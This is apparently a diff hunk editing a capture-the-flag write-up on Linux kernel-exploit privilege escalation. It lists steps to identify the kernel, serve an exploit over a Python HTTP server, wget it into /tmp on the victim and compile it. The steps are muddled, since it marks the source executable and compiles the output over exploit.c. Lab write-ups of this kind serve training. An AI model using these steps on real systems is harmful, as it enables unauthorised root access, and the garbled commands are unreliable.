@@ -20,10 +20,10 @@ Question 5: What vulnerability seems to affect the kernel of the target system? 
 Task 5 {Privilege Escalation - Kernel Exploits}
 
 Question 1: What is the content of the flag1.txt file?
-{{First, identify the kernel version using uname -a.
+{{First, enumerate the kernel version with uname -a and which Linux using cat /etc/issue.
 Search for an appropriate exploit (I used the same one in the last task), and download it.
 Start an http server (python3 -m http.server [portnumber] will work)
-On the victim machine navigate to the /tmp/ folder
+On the victim machine, navigate to the /tmp/ folder
 Use wget http://[Your Machine IP:port]/exploit.c
 chmod +x exploit.c
 Compile it using gcc exploit.c -o exploit.c
